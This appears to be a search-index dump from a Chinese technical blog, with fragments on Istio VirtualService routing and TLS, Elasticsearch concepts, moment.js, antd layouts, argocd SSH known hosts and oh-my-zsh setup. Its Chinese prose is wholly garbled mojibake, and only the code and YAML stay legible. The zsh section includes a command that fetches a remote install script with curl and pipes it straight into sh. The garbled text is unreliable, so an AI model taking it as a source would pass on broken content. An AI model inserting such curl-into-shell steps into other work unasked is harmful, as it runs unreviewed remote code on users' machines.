è¿™ä¸¤ç§æ–¹å¼éƒ½ä¸å¤Ÿå®Œç¾ï¼Œæˆ‘ä»¬çŸ¥é“ï¼ŒçœŸæ­£è§£å†³è¿™ç§ç½‘ç»œé—®é¢˜éœ€è¦ä½¿ç”¨VLANæŠ€æœ¯ï¼Œäºæ˜¯Googleçš„åŒå­¦ä»¬ä¸ºLinuxå†…æ ¸å®ç°äº†ä¸€ä¸ªIPVLANçš„é©±åŠ¨ï¼Œè¿™åŸºæœ¬ä¸Šå°±æ˜¯ä¸ºDockeré‡èº«å®šåˆ¶çš„ã€‚ ","date":"2021-11-07 20:09","objectID":"/post/2741/:0:1","tags":["linux"],"title":"Linux Network Namespace","uri":"/post/2741/"},{"categories":["å…¶ä»–","å‰ç«¯"],"content":" //åˆ¤æ–­æ˜¯å¦å†…ç½‘IP function IsLAN(ip: string) { ip.toLowerCase(); if(ip=='localhost') return true; let a_ip = 0; if(ip == \"\") return false; const aNum = ip.split(\".\"); if(aNum.length != 4) return false; a_ip += parseInt(aNum[0]) \u003c\u003c 24; a_ip += parseInt(aNum[1]) \u003c\u003c 16; a_ip += parseInt(aNum[2]) \u003c\u003c 8; a_ip += parseInt(aNum[3]) \u003c\u003c 0; a_ip=a_ip\u003e\u003e16 \u0026 0xFFFF; return( a_ip\u003e\u003e8 == 0x7F || a_ip\u003e\u003e8 == 0xA || a_ip== 0xC0A8 || (a_ip\u003e=0xAC10 \u0026\u0026 a_ip\u003c=0xAC1F) ); } ","date":"2021-11-04 20:18","objectID":"/post/2738/:0:0","tags":["js"],"title":"js åˆ¤æ–­æ˜¯å¦å†…ç½‘IP","uri":"/post/2738/"},{"categories":["å…¶ä»–"],"content":"featï¼šæ–°åŠŸèƒ½ï¼ˆfeatureï¼‰ fixï¼šä¿®è¡¥bug docsï¼šæ–‡æ¡£ï¼ˆdocumentationï¼‰ styleï¼š æ ¼å¼ï¼ˆä¸å½±å“ä»£ç è¿è¡Œçš„å˜åŠ¨ï¼‰ refactorï¼šé‡æ„ï¼ˆå³ä¸æ˜¯æ–°å¢åŠŸèƒ½ï¼Œä¹Ÿä¸æ˜¯ä¿®æ”¹bugçš„ä»£ç å˜åŠ¨ï¼‰ testï¼šå¢åŠ æµ‹è¯• choreï¼šæ„å»ºè¿‡ç¨‹æˆ–è¾…åŠ©å·¥å…·çš„å˜åŠ¨ ","date":"2021-11-04 14:35","objectID":"/post/2737/:0:0","tags":["git"],"title":"git commit","uri":"/post/2737/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸€ã€NRT(è¿‘å®æ—¶) ä»æ•°æ®è¢«å†™åˆ°ESåˆ°å¯è¢«æ£€ç´¢å¯ä»¥è¾¾åˆ°ç§’çº§ ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:1","tags":["elasticsearch"],"title":"elasticsearchæ ¸å¿ƒæ¦‚å¿µ","uri":"/post/2735/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"äºŒã€Document(æ–‡æ¡£) ç†è§£ä¸ºä¸€ä¸ªJSONæ•°æ®ã€‚æ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªå•†å“æ–‡æ¡£ { \"name\": \"é”®ç›˜\", \"desc\": \"è¿™æ˜¯ä¸€ä¸ªçº¢è½´é”®ç›˜\", \"price\": 1200, \"brand\": \"cherry\", } ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:2","tags":["elasticsearch"],"title":"elasticsearchæ ¸å¿ƒæ¦‚å¿µ","uri":"/post/2735/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸‰ã€Field(å­—æ®µ) æ–‡æ¡£ä¸­çš„å±æ€§,ç†è§£ä¸ºjsonä¸­çš„key ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:3","tags":["elasticsearch"],"title":"elasticsearchæ ¸å¿ƒæ¦‚å¿µ","uri":"/post/2735/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å››ã€Index(ç´¢å¼•) ä¸€ä¸ªindexåŒ…å«å¤šä¸ªæ•°æ®ç»“æ„ç›¸ä¼¼çš„documentã€‚ ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:4","tags":["elasticsearch"],"title":"elasticsearchæ ¸å¿ƒæ¦‚å¿µ","uri":"/post/2735/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"äº”ã€Type(ç±»å‹) æ¯ä¸ªç´¢å¼•ä¸­å¯ä»¥åŒ…å«å¤šä¸ªtypeï¼Œtypeå¯ä»¥ä¸ºindexåšé€»è¾‘åˆ†ç±»,ä¸åŒçš„åˆ†ç±»å¯ä»¥å®šä¹‰ä¸åŒçš„fieldã€‚æ¯”å¦‚ä¸€ä¸ªå•†å“ç´¢å¼•ï¼Œå¯ä»¥åŒ…å«è®¸å¤šä¸åŒç§ç±»çš„å•†å“ï¼Œä¸åŒç§ç±»çš„å•†å“æ•°æ®ç»“æ„å­—æ®µå¯èƒ½ä¸ç›¸åŒã€‚ä¸¾ä¸ªä¾‹å­: ä¸‹é¢æœ‰ä¸¤ä¸ªå•†å“ å¤–è®¾åˆ†ç±» { \"name\": \"é”®ç›˜\", \"desc\": \"è¿™æ˜¯ä¸€ä¸ªçº¢è½´é”®ç›˜\", \"price\": 1200, \"brand\": \"cherry\" } é£Ÿå“åˆ†ç±» { \"name\": \"æ–¹ä¾¿é¢\", \"desc\": \"é¦™è¾£ç‰›è‚‰é¢\", \"price\": 15, \"shelfLife\": \"6ä¸ªæœˆ\" } ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:5","tags":["elasticsearch"],"title":"elasticsearchæ ¸å¿ƒæ¦‚å¿µ","uri":"/post/2735/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å…­ã€Mapping(æ˜ å°„) æ˜ å°„æ˜¯å®šä¹‰æ–‡æ¡£å¦‚ä½•å­˜å‚¨å’Œç´¢å¼•çš„è¿‡ç¨‹ï¼Œæ‰€ä»¥åˆ›å»ºç´¢å¼•æ—¶è¦æŒ‡å®šç´¢å¼•å’Œæ–‡æ¡£çš„æ˜ å°„å…³ç³»ã€‚ä¾‹å¦‚ä¸‹é¢å®šä¹‰äº†å­—æ®µçš„æ•°æ®ç±»å‹ { \"mappings\": { \"peripheral\": { \"properties\": { \"name\": {\"type\": \"string\"}, \"desc\": {\"type\": \"string\"}, \"price\": {\"type\": \"double\"}, \"brand\": {\"type\": \"string\"} } } } } ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:6","tags":["elasticsearch"],"title":"elasticsearchæ ¸å¿ƒæ¦‚å¿µ","uri":"/post/2735/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"ä¸ƒã€Shard(åˆ†ç‰‡) Shardä¹Ÿç§°ä¸ºPrimary Shard eså¯ä»¥å°†ä¸€ä¸ªç´¢å¼•ä¸­çš„æ•°æ®åˆ‡åˆ†æˆå¤šä¸ªè¾ƒå°çš„Shardï¼Œåˆ†å¸ƒåœ¨ä¸åŒçš„Nodeä¸Šå­˜å‚¨ã€‚ ESä¼šæŠŠæŸ¥è¯¢å‘é€ç»™æ¯ä¸ªç›¸å…³çš„åˆ†ç‰‡,ä»è€Œæé«˜ååé‡ã€‚è¿™æ ·å°±å¯ä»¥è§£å†³å•å°æœºå™¨æ€§èƒ½ç“¶é¢ˆé—®é¢˜ã€‚ é»˜è®¤æƒ…å†µä¸‹æœ‰5ä¸ªPrimary Shard ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:7","tags":["elasticsearch"],"title":"elasticsearchæ ¸å¿ƒæ¦‚å¿µ","uri":"/post/2735/"},{"categories":["ç³»ç»ŸæœåŠ¡"],"content":"å…«ã€Replica(å‰¯æœ¬) Replicaä¹Ÿç§°ä¸ºReplica Shard å½“æŸä¸ªNodeå‘ç”Ÿæ•…éšœæ—¶,shardä¼šå¤„äºä¸¢å¤±çŠ¶æ€,å› æ­¤å¯ä»¥ä¸ºæ¯ä¸ªshardåˆ›å»ºå¤šä¸ªå‰¯æœ¬ã€‚å¥½å¤„å¦‚ä¸‹ å†—ä½™èƒ½åŠ› å½“æŸä¸ªNodeæ•…éšœæ—¶å¯ä»¥ä½¿ç”¨å…¶ä»–Nodeä¸­çš„replicaæ¥ä½œä¸ºå¤‡ç”¨ã€‚ æé«˜æ£€ç´¢æ€§èƒ½ Replica Shardä¹Ÿå¯ä»¥æä¾›æŸ¥è¯¢çš„èƒ½åŠ›ï¼Œæ‰€ä»¥åœ¨æ‰§è¡Œå¤šä¸ªæ£€ç´¢æ“ä½œçš„æ—¶å€™å¯ä»¥å°†è¯·æ±‚å‘é€åˆ°ä¸é€šçš„å‰¯æœ¬ä¸­ é»˜è®¤æƒ…å†µä¸‹æ¯ä¸ªPrimary Shardæœ‰1ä¸ªReplica Shardã€‚Replica Shardä¸èƒ½å’ŒPrimary Shardåœ¨åŒä¸€èŠ‚ç‚¹ä¸Šã€‚ ","date":"2021-11-02 21:57","objectID":"/post/2735/:0:8","tags":["elasticsearch"],"title":"elasticsearchæ ¸å¿ƒæ¦‚å¿µ","uri":"/post/2735/"},{"categories":["å‰ç«¯"],"content":"1.è·å–å½“å‰æœˆä»½çš„ç¬¬ä¸€å¤©\u0026æœ€åä¸€å¤© moment().startOf('month').format(\"YYYY-MM-DD\") moment().endOf('month').format(\"YYYY-MM-DD\") ","date":"2021-10-28 22:28","objectID":"/post/2733/:0:1","tags":["antd pro","react","nodejs","antd"],"title":"momentè·å–å„ç§æ—¶é—´","uri":"/post/2733/"},{"categories":["å‰ç«¯"],"content":"2.è·å–å½“å‰çš„æ—¥æœŸ moment().format('YYYY-MM-DD') ","date":"2021-10-28 22:28","objectID":"/post/2733/:0:2","tags":["antd pro","react","nodejs","antd"],"title":"momentè·å–å„ç§æ—¶é—´","uri":"/post/2733/"},{"categories":["å‰ç«¯"],"content":"3.è·å–ä»Šå¹´çš„æ—¥æœŸèŒƒå›´ moment().startOf('year').format('YYYY-MM-DD') moment().endOf('year').format('YYYY-MM-DD') ","date":"2021-10-28 22:28","objectID":"/post/2733/:0:3","tags":["antd pro","react","nodejs","antd"],"title":"momentè·å–å„ç§æ—¶é—´","uri":"/post/2733/"},{"categories":["å‰ç«¯"],"content":"4.æ—¶é—´åŠ å‡ // è·å–æ˜å¤©çš„æ—¥æœŸ moment().add(1,'days').format('YYYY-MM-DD') // è·å–æ˜¨å¤©çš„æ—¥æœŸ moment().add(-1,'days').format('YYYY-MM-DD') ","date":"2021-10-28 22:28","objectID":"/post/2733/:0:4","tags":["antd pro","react","nodejs","antd"],"title":"momentè·å–å„ç§æ—¶é—´","uri":"/post/2733/"},{"categories":["å‰ç«¯"],"content":"ä¸¤ç§ return( \u003c\u003e {/* çŠæ ¼-Flexå¡«å…… */} \u003cDivider orientation=\"left\"\u003eRaw flex style\u003c/Divider\u003e \u003cRow gutter={[16,16]}\u003e \u003cCol flex=\"1 1 400px\"\u003e \u003cProCard\u003e1\u003c/ProCard\u003e \u003c/Col\u003e \u003cCol flex=\"1 1 400px\"\u003e \u003cProCard\u003e2\u003c/ProCard\u003e \u003c/Col\u003e \u003cCol flex=\"1 1 400px\"\u003e \u003cProCard\u003e3\u003c/ProCard\u003e \u003c/Col\u003e \u003c/Row\u003e {/* gutterè®¾ç½®çŠæ ¼ä¹‹é—´çš„æ°´å¹³å’Œå‚ç›´é—´è· colSpanè®¾ç½®åœ¨ä¸åŒçª—å£å¤§å°ä¸‹çš„æ˜¾ç¤ºå¤§å°ã€‚ä¸€è¡Œå æ»¡æ˜¯24ã€‚ çª—å£å¤§å°ä»å°åˆ°å¤§åˆ†åˆ«æ˜¯xs, sm, md, lg, xl */} \u003cProCard style={{ marginTop: 8 }} gutter={[16, 16]} wrap\u003e \u003cProCard colSpan={{sm: 24, md: 8}} bordered headerBordered title=\"bt1\" extra=\"extra\" tooltip=\"è¿™æ˜¯æç¤º\"\u003e Col \u003c/ProCard\u003e \u003cProCard colSpan={{sm: 24, md: 8}} bordered headerBordered title=\"bt2\" extra=\"extra\" tooltip=\"è¿™æ˜¯æç¤º\"\u003e Col \u003c/ProCard\u003e \u003cProCard colSpan={{sm: 24, md: 8}} bordered headerBordered title=\"bt3\" extra=\"extra\" tooltip=\"è¿™æ˜¯æç¤º\"\u003e Col \u003c/ProCard\u003e \u003c/ProCard\u003e \u003c/\u003e ); ","date":"2021-10-26 13:57","objectID":"/post/2731/:0:0","tags":["antd pro","react","antd"],"title":"ant designç»„ä»¶å“åº”å¼æ¢è¡Œ","uri":"/post/2731/"},{"categories":["kubernetes","Istio"],"content":"èƒŒæ™¯ å½“æˆ‘ä»¬æœ‰ä¸¤ä¸ªvirtualserviceå¹¶ä¸”è·¯ç”±åŒ¹é…éƒ½æ˜¯ä½¿ç”¨match.uri.prefix,ç¬¬ä¸€ä¸ªè·¯ç”±r1æ˜¯åŒ¹é…/itå‰ç¼€ï¼Œç¬¬äºŒä¸ªè·¯ç”±r2åŒ¹é…/itemå‰ç¼€ã€‚ è¿™æ—¶ä½ ä¼šå‘ç°æ— è®ºæ˜¯è®¿é—®/itã€/it/ã€/it/xxxï¼Œ/itemï¼Œ/item/ï¼Œ/item/xxéƒ½ä¼šåŒ¹é…åˆ°r1å¯¹åº”çš„æœåŠ¡ã€‚ ç”±äºvsä¸æ”¯æŒpriorityï¼Œå¯ä»¥é€šè¿‡ä¸‹é¢å‡ ç§æ–¹æ³•è§£å†³ åˆå¹¶virtualservice(æ¨è) ä½¿ç”¨regexåŒ¹é…è·¯ç”± å†™ä¸€ä¸ªprefix: /it/ ä¸€ä¸ªexact: /it ä¸‹é¢ä½¿ç”¨regexçš„æ–¹å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ ","date":"2021-10-20 23:28","objectID":"/post/2729/:0:1","tags":["istio"],"title":"è§£å†³virtualserviceå‰ç¼€è·¯ç”±åŒ¹é…å†²çªé—®é¢˜","uri":"/post/2729/"},{"categories":["kubernetes","Istio"],"content":"ä¸€ã€éƒ¨ç½²æµ‹è¯•æœåŠ¡ éƒ¨ç½²ä¸¤ä¸ªnginxæœåŠ¡ç”¨äºæµ‹è¯•è·¯ç”± apiVersion: apps/v1 kind: Deployment metadata: name: n1 namespace: istio-demo spec: replicas: 1 selector: matchLabels: app: nginx version: v1 template: metadata: labels: app: nginx version: v1 spec: containers: - name: nginx image: nginx:1.14-alpine imagePullPolicy: IfNotPresent ports: - name: http containerPort: 80 --- apiVersion: v1 kind: Service metadata: name: n1-svc namespace: istio-demo spec: type: ClusterIP ports: - name: http port: 80 targetPort: 80 selector: app: nginx version: v1 --- apiVersion: apps/v1 kind: Deployment metadata: name: n2 namespace: istio-demo spec: replicas: 1 selector: matchLabels: app: nginx version: v2 template: metadata: labels: app: nginx version: v2 spec: containers: - name: nginx image: nginx:1.14-alpine imagePullPolicy: IfNotPresent ports: - name: http containerPort: 80 --- apiVersion: v1 kind: Service metadata: name: n2-svc namespace: istio-demo spec: type: ClusterIP ports: - name: http port: 80 targetPort: 80 selector: app: nginx version: v2 ä¸Šé¢åªæ˜¯å•çº¯çš„åˆ›å»ºäº†ä¸¤ä¸ªnginxåº”ç”¨å’Œä¸¤ä¸ªserviceï¼Œåé¢é€šè¿‡æµè§ˆå™¨è®¿é—®ï¼Œè§‚å¯Ÿnginxæ—¥å¿—æ¥ç¡®è®¤æµé‡è¿›å…¥äº†å“ªä¸ªåº”ç”¨ ","date":"2021-10-20 23:28","objectID":"/post/2729/:0:2","tags":["istio"],"title":"è§£å†³virtualserviceå‰ç¼€è·¯ç”±åŒ¹é…å†²çªé—®é¢˜","uri":"/post/2729/"},{"categories":["kubernetes","Istio"],"content":"äºŒã€é…ç½®æœ‰é—®é¢˜çš„è·¯ç”±è§„åˆ™ apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: r1 namespace: istio-demo spec: gateways: - istio-system/public-gateway hosts: - 'n1-svc' - 'headers.t.cn' http: - route: - destination: host: n1-svc match: - uri: prefix: '/it' --- apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: r2 namespace: istio-demo spec: gateways: - istio-system/public-gateway hosts: - 'n2-svc' - 'headers.t.cn' http: - route: - destination: host: n2-svc match: - uri: prefix: /item æµ‹è¯•è®¿é—®æƒ…å†µ: é¦–å…ˆæ‰“å¼€ä¸¤ä¸ªæ§åˆ¶å°è§‚å¯Ÿpodçš„æ—¥å¿— åœ¨æµè§ˆå™¨è®¿é—®/itã€/it/ã€/it/xxxã€/itemã€/item/ã€/item/xxxå‡è®¿é—®åˆ°n1æœåŠ¡ä¸Š(n2æœåŠ¡çš„è§„åˆ™å¤±æ•ˆ) åˆ é™¤n1çš„è·¯ç”±åŒ¹é…è§„åˆ™ï¼Œæ­¤æ—¶/itemã€/item/ã€/item/xxxå‡è®¿é—®åˆ°n2æœåŠ¡ä¸Š ","date":"2021-10-20 23:28","objectID":"/post/2729/:0:3","tags":["istio"],"title":"è§£å†³virtualserviceå‰ç¼€è·¯ç”±åŒ¹é…å†²çªé—®é¢˜","uri":"/post/2729/"},{"categories":["kubernetes","Istio"],"content":"è§£å†³æ–¹æ³• ä¿®æ”¹prefixä¸ºregex apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: r1 namespace: istio-demo spec: gateways: - istio-system/public-gateway hosts: - 'n1-svc' - 'headers.t.cn' http: - route: - destination: host: n1-svc match: - uri: # åŒ¹é…/it/å¼€å¤´æˆ–/itçš„uri regex: '(\\/it\\/.*)|(\\/it\\/?)' --- apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: r2 namespace: istio-demo spec: gateways: - istio-system/public-gateway hosts: - 'n2-svc' - 'headers.t.cn' http: - route: - destination: host: n2-svc match: - uri: # åŒ¹é…/item/å¼€å¤´æˆ–/itemçš„uri,è¿™é‡Œå…¶å®ä¸æ”¹ä¹Ÿå¯ä»¥,å› ä¸ºr1è·¯ç”±å·²ç»ä¸ä¼šå½±å“åˆ°r2è·¯ç”±äº† regex: '(\\/item\\/.*)|(\\/item\\/?)' ç»æµ‹è¯• è®¿é—®/itã€/it/ã€/it/xxxä¼šè·¯ç”±åˆ°n1åº”ç”¨ è®¿é—®/itemã€/item/ã€/item/xxxä¼šè·¯ç”±åˆ°n2åº”ç”¨ ","date":"2021-10-20 23:28","objectID":"/post/2729/:0:4","tags":["istio"],"title":"è§£å†³virtualserviceå‰ç¼€è·¯ç”±åŒ¹é…å†²çªé—®é¢˜","uri":"/post/2729/"},{"categories":["kubernetes","Istio"],"content":"http rewrite apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: web-server-headers spec: gateways: - istio-system/public-gw hosts: - '*' http: - match: - uri: prefix: '/headers/' - uri: prefix: '/headers' rewrite: uri: '/' route: - destination: host: web-server-headers port: number: 5000 å½“æˆ‘ä»¬è®¿é—®: http://ops.cn/headers/versionï¼Œä¸Šé¢çš„ä¾‹å­ä¸­å¦‚æœæ²¡æœ‰rewrite,é‚£ä¹ˆæˆ‘ä»¬çš„åå°æœåŠ¡æ”¶åˆ°çš„è¯·æ±‚å°†æ˜¯/headers/versionã€‚æœ‰æ—¶å€™æˆ‘ä»¬çš„æœåŠ¡åªéœ€è¦/versionã€‚æ‰€ä»¥æˆ‘ä»¬é…ç½®rewriteï¼Œå°†/headers/å’Œ/headersé‡å†™ä¸º/ï¼Œç„¶åäº¤ç»™åå°æœåŠ¡ ","date":"2021-10-15 11:29","objectID":"/post/2723/:0:1","tags":["k8s","istio","servicemesh"],"title":"Istio-virtualserviceåŠŸèƒ½æµ‹è¯•","uri":"/post/2723/"},{"categories":["kubernetes","Istio"],"content":"http redirect apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: web-server-headers spec: gateways: - istio-system/public-gw hosts: - '*' http: - match: - uri: prefix: '/headers/' - uri: prefix: '/headers' redirect: authority: soulchild.cn redirectCode: 301 uri: '/aaa' å®¢æˆ·ç«¯å°†ä¼šé‡å®šå‘åˆ°æŒ‡å®šçš„ç«™ç‚¹ã€‚authorityæŒ‡å®šé‡å®šå‘åˆ°å“ªä¸ªä¸»æœº,redirectCodeæ˜¯å“åº”çŠ¶æ€ç ï¼Œuriæ˜¯è¯·æ±‚çš„è·¯å¾„ ","date":"2021-10-15 11:29","objectID":"/post/2723/:0:2","tags":["k8s","istio","servicemesh"],"title":"Istio-virtualserviceåŠŸèƒ½æµ‹è¯•","uri":"/post/2723/"},{"categories":["kubernetes","Istio"],"content":"fault è¿™é‡Œæœ‰ä¸ªç–‘é—®,æ•…éšœæ³¨å…¥çš„å»¶è¿Ÿæ˜¯å‘ç”Ÿåœ¨å“ªé‡Œçš„ï¼Ÿå®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡ç«¯çš„sidecarï¼Ÿ apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: web-server-headers spec: gateways: - istio-system/public-gw hosts: - '*' http: - match: - uri: prefix: '/headers/' - uri: prefix: '/headers' rewrite: uri: '/' fault: delay: fixedDelay: 10s percent: 100 route: - destination: host: web-server-headers port: number: 5000 æµ‹è¯•æµé‡çš„æ–¹æ³•: å¼€å¯ä¸€ä¸ªå®¢æˆ·ç«¯POD æŠ“å–istio-ingressgatewayè¿™ä¸ªPODçš„æ•°æ®åŒ…(åªæŠ“å–å®¢æˆ·ç«¯PODçš„IPå’Œåç«¯æœåŠ¡çš„IP) æŠ“å–åç«¯æœåŠ¡PODçš„æ•°æ®åŒ…(åªæŠ“å–gatewayçš„IP) å®¢æˆ·ç«¯PODè¯·æ±‚ç›®æ ‡æœåŠ¡(curl -I http://istio-ingressgateway.istio-system/headers) è§‚å¯Ÿæ•°æ®åŒ…æƒ…å†µ åˆ†æ: å½“curlæ‰§è¡Œågatewayé©¬ä¸Šå‡ºç°è¯·æ±‚åŒ…ï¼Œåç«¯æœåŠ¡çš„æ•°æ®åŒ…æ²¡æœ‰å†…å®¹ã€‚ ç­‰å¾…10såï¼Œgatewayæ‰å°†è¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡ï¼Œæ­¤æ—¶åç«¯æœåŠ¡æ”¶åˆ°æ•°æ®åŒ…å¹¶å“åº”ã€‚ ç”±æ­¤å¯è§å»¶è¿Ÿçš„æ•…éšœæ³¨å…¥æ˜¯å‘ç”Ÿåœ¨æœåŠ¡çš„è¯·æ±‚æ–¹çš„ï¼Œ æœ€åæ³¨æ„: ä¸Šé¢çš„é…ç½®ä»…å¯¹gatewayç”Ÿæ•ˆ,å¦‚æœæƒ³åœ¨ç½‘æ ¼å†…ç”Ÿæ•ˆè¯·åœ¨gatewaysæ·»åŠ meshã€‚æ·»åŠ meshååŒæ ·æ•…éšœæ³¨å…¥æ˜¯åœ¨clientç«¯çš„ æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚ ","date":"2021-10-15 11:29","objectID":"/post/2723/:0:3","tags":["k8s","istio","servicemesh"],"title":"Istio-virtualserviceåŠŸèƒ½æµ‹è¯•","uri":"/post/2723/"},{"categories":["kubernetes","devops"],"content":"è§å›¾ 68027-jkuckk0nldl.png ","date":"2021-10-15 09:35","objectID":"/post/2720/:0:0","tags":["k8s","devops","tekton"],"title":"tekton-trigger","uri":"/post/2720/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"å®‰è£…oh-my-zsh # å®‰è£…oh-my-zsh sh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" æ²¡æœ‰zshéœ€è¦å…ˆå®‰è£…zshã€‚ yum install zsh ","date":"2021-10-14 17:36","objectID":"/post/2717/:1:0","tags":["zsh"],"title":"zshå®‰è£…é…ç½®","uri":"/post/2717/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"ä¿®æ”¹ä¸»é¢˜ vim ~/.zshrc ZSH_THEME=\"robbyrussell\" ","date":"2021-10-14 17:36","objectID":"/post/2717/:2:0","tags":["zsh"],"title":"zshå®‰è£…é…ç½®","uri":"/post/2717/"},{"categories":["å…¶ä»–","åŸºç¡€å†…å®¹"],"content":"ä¿®æ”¹å‘½ä»¤è¡Œæ ·å¼: vim ~/.oh-my-zsh/themes/robbyrussell.zsh-theme PROMPT=\"%(?:%{$fg_bold[green]%} [em..] âœ :%{$fg_bold[red]%} [em..] âœ )\" ","date":"2021-10-14 17:36","objectID":"/post/2717/:3:0","tags":["zsh"],"title":"zshå®‰è£…é…ç½®","uri":"/post/2717/"},{"categories":["kubernetes"],"content":"è§£å†³æ–¹æ³•: ä¿®æ”¹argocd-ssh-known-hosts-cmè¿™ä¸ªconfigmapï¼Œæ·»åŠ è¦ä¿¡ä»»çš„ä¸»æœºå…¬é’¥ä¿¡æ¯ã€‚ å…¬é’¥ä¿¡æ¯å¯ä»¥é€šè¿‡å…¶ä»–å·²è¿æ¥è¿‡çš„ä¸»æœºä¸­çš„known_hostsè·å–. ä¹Ÿå¯ä»¥é€šè¿‡ç±»ä¼¼ssh-keyscan gitlab.soulchild.cnè·å– è¿™ä¸ªconfigmapè¢«æŒ‚è½½åˆ°argocd-serverå’Œargocd-repo-server PODä¸­çš„/app/config/sshç›®å½•ä¸‹ã€‚ ","date":"2021-10-13 10:22","objectID":"/post/2714/:0:0","tags":["argocd"],"title":"argocd Unable to connect SSH repository: ssh: handshake failed: knownhosts: key is unknown","uri":"/post/2714/"},{"categories":["Istio"],"content":"ä¸€ã€ éƒ¨ç½²æ­£å¸¸æœåŠ¡ 1.åˆå§‹åŒ– # åˆ›å»ºns k create ns istio-demo # å¼€å¯è‡ªåŠ¨æ³¨å…¥ k label ns istio-demo istio-injection=enabled 2.éƒ¨ç½²nginx apiVersion: apps/v1 kind: Deployment metadata: name: nginx-v1 namespace: istio-demo spec: replicas: 1 selector: matchLabels: app: nginx version: v1 template: metadata: labels: app: nginx version: v1 spec: initContainers: - name: busybox image: busybox volumeMounts: - name: www mountPath: /tmp command: [\"sh\", \"-c\", \"echo 'v1' \u003e /tmp/index.html\"] containers: - name: nginx image: nginx:1.14-alpine imagePullPolicy: IfNotPresent ports: - name: http containerPort: 80 volumeMounts: - name: www mountPath: /usr/share/nginx/html/ volumes: - name: www emptyDir: {} --- apiVersion: v1 kind: Service metadata: name: nginx-svc namespace: istio-demo spec: type: ClusterIP ports: - name: http port: 80 targetPort: 80 selector: app: nginx 3.æš´éœ²æœåŠ¡ apiVersion: networking.istio.io/v1alpha3 kind: Gateway metadata: name: nginx-gw namespace: istio-demo spec: selector: istio: ingressgateway servers: - hosts: - \"nginx-istio.ops.cn\" port: number: 80 name: http protocol: HTTP --- apiVersion: networking.istio.io/v1alpha3 kind: VirtualService metadata: name: nginx-vs namespace: istio-demo spec: exportTo: - \"*\" gateways: - nginx-gw hosts: - 'nginx-svc' - 'nginx-istio.ops.cn' http: - route: - destination: host: nginx-svc subset: v1 weight: 100 - destination: host: nginx-svc subset: v2 --- apiVersion: networking.istio.io/v1alpha3 kind: DestinationRule metadata: name: nginx-dr namespace: istio-demo spec: host: nginx-svc subsets: - name: v1 labels: version: v1 - name: v2 labels: version: v2 è®¿é—®æµ‹è¯•: 77024-rhlfdm1gsi.png ","date":"2021-10-08 16:35","objectID":"/post/2709/:0:1","tags":["k8s","istio"],"title":"Istio é…ç½®istio-ingressgateway å•å‘TLS","uri":"/post/2709/"},{"categories":["Istio"],"content":"äºŒã€ä¿®æ”¹ä¸ºhttpsè®¿é—® åœ¨æˆ‘ä»¬è¿™é‡Œä¾‹å­ä¸­åªéœ€è¦ä¿®æ”¹gwå°±å¯ä»¥äº†,é¦–å…ˆéœ€è¦å‡†å¤‡è¯ä¹¦å’Œç§é’¥,è¿™ä¸€æ­¥ç•¥è¿‡äº†(é…ç½®è‡ªç­¾è¯ä¹¦) ç¬¬äºŒæ­¥: åˆ›å»ºä¸€ä¸ªåŒ…å«è¯ä¹¦ä¿¡æ¯çš„secret k create -n istio-system secret generic nginx-istio.ops.cn-tls \\ --from-file=key=tls/ops.cn_key \\ --from-file=cert=tls/ops.cn_crt ç¬¬ä¸‰æ­¥: ä¿®æ”¹Gateway apiVersion: networking.istio.io/v1beta1 kind: Gateway metadata: name: nginx-gw namespace: istio-demo spec: selector: istio: ingressgateway servers: - hosts: - nginx-istio.ops.cn port: name: http number: 80 protocol: HTTP - hosts: - nginx-istio.ops.cn port: name: https number: 8443 protocol: HTTPS tls: credentialName: nginx-istio.ops.cn-tls mode: SIMPLE ç¬¬å››æ­¥: éªŒè¯ ç”±äºæ˜¯è‡ªç­¾åè¯ä¹¦æ‰€ä»¥æ˜¯ä¸å—ä¿¡ä»»çš„ 02399-p8i08e0sjzg.png ","date":"2021-10-08 16:35","objectID":"/post/2709/:0:2","tags":["k8s","istio"],"title":"Istio é…ç½®istio-ingressgateway å•å‘TLS","uri":"/post/2709/"},{"categories":["kubernetes","Istio"],"content":"Istioä¸­çš„æ­£åˆ™(RE2)ä½¿ç”¨èµ·æ¥ä¸ä¹ æƒ¯,é˜²æ­¢å¿˜è®°ç‰¹ç•™æ­¤æ–‡ apiVersion: networking.istio.io/v1beta1 kind: VirtualService metadata: name: nginx-vs namespace: istio-demo spec: exportTo: - '*' hosts: - nginx-svc http: - match: - headers: Cookie: regex: ^(.*?; )?(user=soulchild)(;.*)?$ route: - destination: host: nginx-svc subset: v2 - route: - destination: host: nginx-svc subset: v1 ","date":"2021-10-08 15:14","objectID":"/post/2708/:0:0","tags":["k8s","istio"],"title":"Istio virtualserviceåŒ¹é…cookie","uri":"/post/2708/"},{"categories":["å…¶ä»–"],"content":"åŸºæœ¬è·¯ç”±é…ç½® BrowserRouter/HashRouter 